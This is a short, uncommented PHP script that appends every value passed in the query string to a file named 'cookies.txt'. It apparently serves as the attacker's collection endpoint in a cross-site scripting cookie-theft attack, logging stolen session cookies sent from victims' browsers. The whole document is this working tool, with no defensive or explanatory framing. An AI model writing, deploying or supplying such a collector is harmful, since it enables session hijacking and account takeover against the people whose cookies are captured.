<?php
$handle = fopen('cookies.txt', 'a');
foreach ($_GET as $variable => $value) {
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fclose($handle);
exit;